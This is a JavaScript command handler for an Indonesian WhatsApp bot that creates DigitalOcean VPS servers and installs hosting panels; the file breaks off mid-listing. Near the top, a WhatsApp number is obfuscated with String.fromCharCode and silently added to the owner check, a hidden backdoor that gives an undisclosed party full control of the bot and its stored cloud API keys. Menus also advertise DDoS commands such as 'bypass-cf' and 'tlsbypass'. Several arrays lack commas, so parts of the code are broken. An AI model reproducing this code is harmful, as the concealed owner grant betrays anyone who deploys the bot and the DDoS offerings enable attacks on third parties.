const crypto = require("crypto")
const { Client } = require('ssh2');

module.exports = async (linux, m, store, msg) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ""
	
const budy = (typeof m.text == 'string' ? m.text : '') 
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const cmd = prefix + command
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await linux.decodeJid(linux.user.id)
const owner = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owner].includes(m.sender) ? true : m.isDeveloper ? true : false
const isPremium = premium.includes(m.sender)
const isBot = botNumber.includes(m.sender)
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, resize, sleep } = require('./system/function.js')
const {
	Creator,
	Access,
	Access_Bot
} = require("./Getos")
m.isGroup = m.chat.endsWith("g.us")
m.metadata = m.isGroup ? (await linux.groupMetadata(m.chat).catch(_ => {}) || {}) : {}
m.isAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == m.sender) || false) : false
m.isBotAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == botNumber) || false) : false

// >~~~~~~~~ Fake Quoted ~~~~~~~~~~< //

const qchannel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `120363224727395@newsletter`, newsletterName: `Hore`, jpegThumbnail: "", caption: `Powered By ${namaowner}`, inviteExpiration: 0 }}}

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const fkontak = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": `υρтιмє : ${runtime(process.uptime())}`,
                    "jpegThumbnail": ''
                          }
                        }
                      } 
const reaction = async (jidss, emoji) => {
linux.sendMessage(jidss, { react: { text: emoji, key: m.key }})}
// >~~~~~~~~~~ Function ~~~~~~~~~~~< //

const example = (teks) => {
return `\n *𝖸𝖺𝗇𝗀 𝖡𝖾𝗇𝖾𝗋 𝖨𝗇𝗂 𝖲𝖺𝗒𝖺𝗇𝗀:*\n *${prefix+command}* ${teks}\n`
}

const capital = (string) => {
return string.charAt(0).toUpperCase() + string.slice(1);
}

if (isCmd) {
    console.log(
        chalk.hex("#1E90FF").bold("[ PESAN ]"), 
        chalk.green.bold(`📡 ${m.sender.split("@")[0]} =>`), 
        chalk.yellow.bold(`⚙️ ${prefix+command}`) 
    );
}
    
const qfake = {
    key: {
        remoteJid: "status@broadcast",
        fromMe: false,
        id: "B612",
        participant: "0@s.whatsapp.net"
    },
    message: {
        extendedTextMessage: {
            text: `${botname}`,
            matchedText: `${botname}`,
            canonicalUrl: "https://www.whatsapp.com",
            description: `${namaOwner}`,
            title: "WhatsApp",
            previewType: 0
        }
    }
};    

const hereply = async (teks) => {
    return linux.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: `© Powered by ${namaOwner}`,
                thumbnailUrl: global.image.reply,
                sourceUrl: global.linkGrup
            }
        }
    }, { quoted: qtext });
};

// >~~~~~~~~~ Command ~~~~~~~~~~< //

switch (command) {
case 'menu': {
 const emojis = ['⏳', '⌛', '✅'];
 let count = 0;

 const sendEmojiReactions = async () => {
   if (count < 3) {
     await linux.sendMessage(m.chat, {
       react: {
         text: emojis[count % emojis.length],
         key: m.key,
       },
     });

     count++;
     setTimeout(sendEmojiReactions, 100);
   } else {
     let menu = `
╔═══════════════════╗ 
║      HOSTING LINUX
║ \`➮\` 𝗖𝗿𝗲𝗮𝘁𝗼𝗿: *${global.namaOwner}*
║ \`➮\` 𝗕𝗼𝘁𝗻𝗮𝗺𝗲: *${global.botname}*
║ \`➮\` 𝗩𝗲𝗿𝘀𝗶𝗼𝗻: *2.0.0*
║ \`➮\` 𝗠𝗼𝗱𝗲: *${linux.public ? "Public" : "Self"}*
║ \`➮\` 𝗥𝗲𝗴𝗶𝗼𝗻: *${global.negara}*
╚═══════════════════╝
`;

     let buttons = [
       { buttonId: ".owner", buttonText: { displayText: "𝗢𝘄𝗻𝗲𝗿"} }
       
     ];

     let buttonMessage = {
       image: {
         url: 'https://files.catbox.moe/poqknz.jpg' 
       },
       caption: `${menu}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: 'linuxhere',
           body: 'HOSTING🏖️',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '0@newsletter',
           newsletterName: 'TESTIMONI linuxhere',
           serverMessageId: -1
         }
       },
       footer: "HOSTING🏖️",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };

     const flowActions = [
       {
         buttonId: 'action',
         buttonText: { displayText: 'This Button List' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: "𝗦 𝗘 𝗟 𝗟 𝗘 𝗖 𝗧",
             sections: [
               {
                 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                 highlight_label: "TOP",
                 rows: [
                   { title: "𝗗𝗜𝗚𝗜𝗧𝗔𝗟-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-ᴠᴘs", id: ".vpsmenu" },
                    { title: "𝗜𝗡𝗦𝗧𝗔𝗟𝗟-𝗠𝗘𝗡𝗨", description: "ᴍᴇɴᴜ-ɪɴsᴛᴀʟʟ", id: ".installmenu" },
                    { title: "𝗢𝗪𝗡𝗘𝗥-𝗠𝗘𝗡𝗨", description: "ᴏᴡɴᴇʀ-sᴇᴛᴛɪɴɢ", id: ".ownermenu" },
                   { title: "𝗦𝗨𝗕𝗗𝗢-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-sᴜʙᴅᴏ", id: ".subdomenu" }
                   { title: "DDOS MENU", description: "mainddos", id: ".ufc" }               
                 ]
               }
             ]
           })
         },
         viewOnce: true
       }
     ];
     buttonMessage.buttons.push(...flowActions);
     await linux.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }
 };
 sendEmojiReactions();
};
break;

case "vpsmenu": {        
let teks = `
╔═══════════════════╗ 
║      HOSTING LINUX
║ \`➮\` 𝗖𝗿𝗲𝗮𝘁𝗼𝗿: *${global.namaOwner}*
║ \`➮\` 𝗕𝗼𝘁𝗻𝗮𝗺𝗲: *${global.botname}*
║ \`➮\` 𝗩𝗲𝗿𝘀𝗶𝗼𝗻: *2.0.0*
║ \`➮\` 𝗠𝗼𝗱𝗲: *${linux.public ? "Public" : "Self"}*
║ \`➮\` 𝗥𝗲𝗴𝗶𝗼𝗻: *${global.negara}*
╚═══════════════════╝
╔═══════════════════╗ 
║   ☁ 𝗗𝗜𝗚𝗜𝗧𝗔𝗟  𝗠𝗘𝗡𝗨 ☁
╚═══════════════════╝

┌───────────────────────
├─ ᴄᴠᴘs
├─ ʟɪsᴛᴅʀᴏᴘʟᴇᴛ
├─ ᴅᴇʟᴅʀᴏᴘʟᴇᴛ
├─ sɪsᴀᴅʀᴏᴘʟᴇᴛ
├─ ʀᴇsᴛᴀʀᴛᴠᴘs
├─ sᴛᴀʀᴛᴠᴘs
├─ ʀᴇʙᴜɪʟᴅ 
└───────────────────────

`
let buttons = [
       { buttonId: ".owner", buttonText: { displayText: "𝗢𝘄𝗻𝗲𝗿"} }

     ];

     let buttonMessage = {
       image: {
         url: 'https://files.catbox.moe/poqknz.jpg' 
       },
       caption: `${teks}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: 'linuxhere',
           body: 'HOSTING🏖️',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '0@newsletter',
           newsletterName: 'TESTIMONI linuxhere',
           serverMessageId: -1
         }
       },
       footer: "HOSTING🏖️",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };

     const flowActions = [
       {
         buttonId: 'action',
         buttonText: { displayText: 'This Button List' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: "𝗦 𝗘 𝗟 𝗟 𝗘 𝗖 𝗧",
             sections: [
               {
                 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                 highlight_label: "TOP",
                 rows: [
                   { title: "𝗗𝗜𝗚𝗜𝗧𝗔𝗟-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-ᴠᴘs", id: ".vpsmenu" },
                    { title: "𝗜𝗡𝗦𝗧𝗔𝗟𝗟-𝗠𝗘𝗡𝗨", description: "ᴍᴇɴᴜ-ɪɴsᴛᴀʟʟ", id: ".installmenu" },
                    { title: "𝗢𝗪𝗡𝗘𝗥-𝗠𝗘𝗡𝗨", description: "ᴏᴡɴᴇʀ-sᴇᴛᴛɪɴɢ", id: ".ownermenu" },
                   { title: "𝗦𝗨𝗕𝗗𝗢-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-sᴜʙᴅᴏ", id: ".subdomenu" }   
                    { title: "DDOS MENU", description: "mainddos", id: ".ufc" }                   
                 ]
               }
             ]
           })
         },
         viewOnce: true
       }
     ];
     buttonMessage.buttons.push(...flowActions);
     await linux.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }

break;
//
case "ufc": {        
let teks = `
╔═══════════════════╗ 
║      HOSTING LINUX
║ \`➮\` 𝗖𝗿𝗲𝗮𝘁𝗼𝗿: *${global.namaOwner}*
║ \`➮\` 𝗕𝗼𝘁𝗻𝗮𝗺𝗲: *${global.botname}*
║ \`➮\` 𝗩𝗲𝗿𝘀𝗶𝗼𝗻: *2.0.0*
║ \`➮\` 𝗠𝗼𝗱𝗲: *${linux.public ? "Public" : "Self"}*
║ \`➮\` 𝗥𝗲𝗴𝗶𝗼𝗻: *${global.negara}*
╚═══════════════════╝
╔═══════════════════╗ 
║   ☁ 𝗗𝗜𝗚𝗜𝗧𝗔𝗟  𝗠𝗘𝗡𝗨 ☁
╚═══════════════════╝

┌───────────────────────
├─ mix
├─ bypass-cf
├─ tlsbypass
├─ tlsv2
├─ tls
├─ tls
└───────────────────────

`
let buttons = [
       { buttonId: ".owner", buttonText: { displayText: "𝗢𝘄𝗻𝗲𝗿"} }

     ];

     let buttonMessage = {
       image: {
         url: 'https://files.catbox.moe/poqknz.jpg' 
       },
       caption: `${teks}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: 'linuxhere',
           body: 'HOSTING🏖️',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '0@newsletter',
           newsletterName: 'TESTIMONI linuxhere',
           serverMessageId: -1
         }
       },
       footer: "HOSTING🏖️",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };

     const flowActions = [
       {
         buttonId: 'action',
         buttonText: { displayText: 'This Button List' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: "𝗦 𝗘 𝗟 𝗟 𝗘 𝗖 𝗧",
             sections: [
               {
                 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                 highlight_label: "TOP",
                 rows: [
                   { title: "𝗗𝗜𝗚𝗜𝗧𝗔𝗟-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-ᴠᴘs", id: ".vpsmenu" },
                    { title: "𝗜𝗡𝗦𝗧𝗔𝗟𝗟-𝗠𝗘𝗡𝗨", description: "ᴍᴇɴᴜ-ɪɴsᴛᴀʟʟ", id: ".installmenu" },
                    { title: "𝗢𝗪𝗡𝗘𝗥-𝗠𝗘𝗡𝗨", description: "ᴏᴡɴᴇʀ-sᴇᴛᴛɪɴɢ", id: ".ownermenu" },
                   { title: "𝗦𝗨𝗕𝗗𝗢-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-sᴜʙᴅᴏ", id: ".subdomenu" }       
                    { title: "DDOS MENU", description: "mainddos", id: ".ufc" }               
                 ]
               }
             ]
           })
         },
         viewOnce: true
       }
     ];
     buttonMessage.buttons.push(...flowActions);
     await linux.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }

break;
//        
        
case "installmenu": {        
let apalah = `
╔═══════════════════╗ 
║      HOSTING LINUX
║ \`➮\` 𝗖𝗿𝗲𝗮𝘁𝗼𝗿: *${global.namaOwner}*
║ \`➮\` 𝗕𝗼𝘁𝗻𝗮𝗺𝗲: *${global.botname}*
║ \`➮\` 𝗩𝗲𝗿𝘀𝗶𝗼𝗻: *2.0.0*
║ \`➮\` 𝗠𝗼𝗱𝗲: *${linux.public ? "Public" : "Self"}*
║ \`➮\` 𝗥𝗲𝗴𝗶𝗼𝗻: *${global.negara}*
╚═══════════════════╝
╔═══════════════════╗ 
║   📤  𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗠𝗘𝗡𝗨  📤
╚═══════════════════╝

┌───────────────────────
├─ ʜᴀᴄᴋʙᴀᴄᴋᴘᴀɴᴇʟ
├─ ɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
├─ ɪɴsᴛᴀʟʟᴛᴇᴍᴀ
├─ ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
├─ ɪɴsᴛᴀʟʟᴛᴇᴍᴀsᴛᴇʟʟᴀʀ
├─ ɪɴsᴛᴀʟʟᴛᴇᴍᴀɴᴇʙᴜʟᴀ
├─ ɪɴsᴛᴀʟʟᴛᴇᴍᴀᴇʟʏsɪᴜᴍ
├─ ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
├─ ɪɴsᴛᴀʟʟᴛᴇᴍᴀʙɪʟʟɪɴɢ
├─ ɪɴsᴛᴀʟʟᴛᴇᴍᴀᴇɴɪɢᴍᴀ
└───────────────────────
`
let buttons = [
       { buttonId: ".owner", buttonText: { displayText: "𝗢𝘄𝗻𝗲𝗿"} }

     ];

     let buttonMessage = {
       image: {
         url: 'https://files.catbox.moe/poqknz.jpg' 
       },
       caption: `${apalah}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: 'linuxhere',
           body: 'HOSTING🏖️',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '0@newsletter',
           newsletterName: 'TESTIMONI linuxhere',
           serverMessageId: -1
         }
       },
       footer: "HOSTING🏖️",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };

     const flowActions = [
       {
         buttonId: 'action',
         buttonText: { displayText: 'This Button List' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: "𝗦 𝗘 𝗟 𝗟 𝗘 𝗖 𝗧",
             sections: [
               {
                 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                 highlight_label: "TOP",
                 rows: [
                   { title: "𝗗𝗜𝗚𝗜𝗧𝗔𝗟-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-ᴠᴘs", id: ".vpsmenu" },
                    { title: "𝗜𝗡𝗦𝗧𝗔𝗟𝗟-𝗠𝗘𝗡𝗨", description: "ᴍᴇɴᴜ-ɪɴsᴛᴀʟʟ", id: ".installmenu" },
                    { title: "𝗢𝗪𝗡𝗘𝗥-𝗠𝗘𝗡𝗨", description: "ᴏᴡɴᴇʀ-sᴇᴛᴛɪɴɢ", id: ".ownermenu" },
                   { title: "𝗦𝗨𝗕𝗗𝗢-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-sᴜʙᴅᴏ", id: ".subdomenu" }         
                    { title: "DDOS MENU", description: "mainddos", id: ".ufc" }             
                 ]
               }
             ]
           })
         },
         viewOnce: true
       }
     ];
     buttonMessage.buttons.push(...flowActions);
     await linux.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }
break;        
        



case "subdomenu": {        
let ganteng = `
╔═══════════════════╗ 
║       HOSTING LINUX
╚═══════════════════╝
╔═══════════════════╗ 
║     🌐 𝗦𝗨𝗕𝗗𝗢 𝗠𝗘𝗡𝗨 🌐
╚═══════════════════╝
┌───────────────────────
├─ sᴜʙᴅᴏ
├─ ᴅᴇʟsᴜʙᴅᴏ
├─ sᴜʙᴅᴏ
├─ ᴅᴇʟsᴜʙᴅᴏ
└───────────────────────

`
let buttons = [
       { buttonId: ".owner", buttonText: { displayText: "𝗢𝘄𝗻𝗲𝗿"} }

     ];

     let buttonMessage = {
       image: {
         url: 'https://files.catbox.moe/poqknz.jpg' 
       },
       caption: `${ganteng}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: 'linuxhere',
           body: 'HOSTING🏖️',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '0@newsletter',
           newsletterName: 'TESTIMONI linuxhere',
           serverMessageId: -1
         }
       },
       footer: "HOSTING🏖️",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };

     const flowActions = [
       {
         buttonId: 'action',
         buttonText: { displayText: 'This Button List' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: "𝗦 𝗘 𝗟 𝗟 𝗘 𝗖 𝗧",
             sections: [
               {
                 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                 highlight_label: "TOP",
                 rows: [
                   { title: "𝗗𝗜𝗚𝗜𝗧𝗔𝗟-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-ᴠᴘs", id: ".vpsmenu" },
                    { title: "𝗜𝗡𝗦𝗧𝗔𝗟𝗟-𝗠𝗘𝗡𝗨", description: "ᴍᴇɴᴜ-ɪɴsᴛᴀʟʟ", id: ".installmenu" },
                    { title: "𝗢𝗪𝗡𝗘𝗥-𝗠𝗘𝗡𝗨", description: "ᴏᴡɴᴇʀ-sᴇᴛᴛɪɴɢ", id: ".ownermenu" },
                   { title: "𝗦𝗨𝗕𝗗𝗢-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-sᴜʙᴅᴏ", id: ".subdomenu" }                 
                    { title: "DDOS MENU", description: "mainddos", id: ".ufc" }     
                 ]
               }
             ]
           })
         },
         viewOnce: true
       }
     ];
     buttonMessage.buttons.push(...flowActions);
     await linux.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }
break;        
        
case "ownermenu": {        
let kentod = `
╔═══════════════════╗ 
║       HOSTING LINUX
╚═══════════════════╝
╔═══════════════════╗ 
├─ 𝗖𝗿𝗲𝗮𝘁𝗼𝗿: *${global.namaOwner}*
├─ 𝗕𝗼𝘁𝗻𝗮𝗺𝗲: *${global.botname}*
├─ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻: *2.0.0*
├─ 𝗠𝗼𝗱𝗲: *${linux.public ? "Public" : "Self"}*
├─ 𝗥𝗲𝗴𝗶𝗼𝗻: *${global.negara}*
╚═══════════════════╝
╔═══════════════════╗ 
║   👑 𝗢𝗪𝗡𝗘𝗥  𝗠𝗘𝗡𝗨 👑
╚═══════════════════╝ 
┌───────────────────────
├─ .ᴀᴅᴅʀᴇsᴇʟᴇʀᴠᴘs
├─ .ᴅᴇʟʀᴇsᴇʟᴇʀᴠᴘs
├─ .ʟɪsᴛʀᴇsᴇʟᴇʀᴠᴘs
├─ .ᴀᴅᴅᴏᴡɴᴇʀ
├─ .ᴅᴇʟᴏᴡɴᴇʀ
├─ .ʟɪsᴛᴏᴡɴᴇʀ
├─ .sᴇʟғ
├─ .ᴘᴜʙʟɪᴄ
└───────────────────────
`
let buttons = [
       { buttonId: ".owner", buttonText: { displayText: "𝗢𝘄𝗻𝗲𝗿"} }

     ];

     let buttonMessage = {
       image: {
         url: 'https://files.catbox.moe/poqknz.jpg' 
       },
       caption: `${kentod}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: 'linuxhere',
           body: 'HOSTING🏖️',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '0@newsletter',
           newsletterName: 'TESTIMONI linuxhere',
           serverMessageId: -1
         }
       },
       footer: "HOSTING🏖️",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };

     const flowActions = [
       {
         buttonId: 'action',
         buttonText: { displayText: 'This Button List' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: "𝗦 𝗘 𝗟 𝗟 𝗘 𝗖 𝗧",
             sections: [
               {
                 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                 highlight_label: "TOP",
                 rows: [
                   { title: "𝗗𝗜𝗚𝗜𝗧𝗔𝗟-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-ᴠᴘs", id: ".vpsmenu" },
                    { title: "𝗜𝗡𝗦𝗧𝗔𝗟𝗟-𝗠𝗘𝗡𝗨", description: "ᴍᴇɴᴜ-ɪɴsᴛᴀʟʟ", id: ".installmenu" },
                    { title: "𝗢𝗪𝗡𝗘𝗥-𝗠𝗘𝗡𝗨", description: "ᴏᴡɴᴇʀ-sᴇᴛᴛɪɴɢ", id: ".ownermenu" },
                   { title: "𝗦𝗨𝗕𝗗𝗢-𝗠𝗘𝗡𝗨", description: "ᴄʀᴇᴀᴛᴇ-sᴜʙᴅᴏ", id: ".subdomenu" }    
                    { title: "DDOS MENU", description: "mainddos", id: ".ufc" }                  
                 ]
               }
             ]
           })
         },
         viewOnce: true
       }
     ];
     buttonMessage.buttons.push(...flowActions);
     await linux.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }
break;        
        
case "cvps": {
    if (!isCreator && !isPremium) return hereply(mess.premium);
    if (!text) return hereply(example("hostname"));

    let hostname = text.trim();

    try {
        const sections = [
            {
                title: "# Silahkan Pilih Salah Satu Akun DigitalOcean",
                highlight_label: "",
                rows: Object.keys(global.apiDigitalOcean).map((key, index) => {
                    let apiKey = global.apiDigitalOcean[key];
                    let isValid = apiKey && apiKey.length >= 64;

                    return {
                        header: `𝗖𝗥𝗘𝗔𝗧𝗘 𝗩𝗣𝗦 𝗩${index + 1}`,
                        title: isValid 
                            ? `Buat VPS di Akun DigitalOcean V${index + 1}` 
                            : `❌ API Key Belum Disetel`,
                        id: `${prefix}res_cvps${index + 1} ${hostname}` 
                    };
                })
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🔹 Pilih Akun DigitalOcean 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./linuxy.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: `📌 *Mau Buat VPS di Akun DigitalOcean yang Mana?*`,
            fileName: "HERRY",
            footer: `*${botname}*`,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: global.image.digitalocean,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await linux.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in cvps:", error);
        return hereply(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;    

case "res_cvps1": case "res_cvps2": case "res_cvps3": case "res_cvps4": case "res_cvps5": 
case "res_cvps6": case "res_cvps7": case "res_cvps8": case "res_cvps9": case "res_cvps10": 
case "res_cvps11": case "res_cvps12": case "res_cvps13": case "res_cvps14": case "res_cvps15": 
case "res_cvps16": case "res_cvps17": case "res_cvps18": case "res_cvps19": case "res_cvps20": {
    if (!isCreator && !isPremium) return hereply(mess.premium);
    if (!text) return hereply(example("hostname"));

    let version = command.replace("res_cvps", "");
    let apikeyDO = global.apiDigitalOcean[`akun${version}`];
    let hostname = text.trim();

    if (!apikeyDO || apikeyDO.length < 64) {
        return hereply(`🚫 *API Key di Akun DigitalOcean V${version} Tidak Valid!*`);
    }

    const sections = [
        {
            title: "# Ubuntu 20.04 (LTS) x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},ubuntu-20-04-x64` }
            ]
        },
        {
            title: "# Ubuntu 22.04 (LTS) x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},ubuntu-22-04-x64` }
            ]
        },
        {
